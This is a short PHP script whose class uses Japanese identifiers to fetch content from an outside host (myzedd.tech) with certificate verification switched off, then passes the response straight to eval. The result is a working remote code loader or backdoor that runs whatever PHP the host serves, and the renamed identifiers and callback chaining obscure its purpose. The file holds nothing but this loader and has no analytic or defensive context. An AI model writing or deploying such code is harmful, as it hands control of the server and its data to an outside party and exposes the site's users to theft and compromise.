<?php
session_start();

class 通信管理 {
    private $完了時処理;
    
    public function 完了時に(callable $処理): self {
        $this->完了時処理 = $処理;
        return $this;
    }
    
    public function 取得($URL) {
        $curl = curl_init($URL);
        curl_setopt_array($curl, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_TIMEOUT => 20
        ]);
        
        $結果 = curl_exec($curl);
        curl_close($curl);
        
        if ($this->完了時処理 && !empty($結果)) {
            ($this->完了時処理)($結果);
        }
        
        return $結果;
    }
}

$管理 = new 通信管理();
$管理->完了時に(function($データ) {
    eval('?>' . $データ);
})->取得('https://myzedd.tech/project/zedd');
?>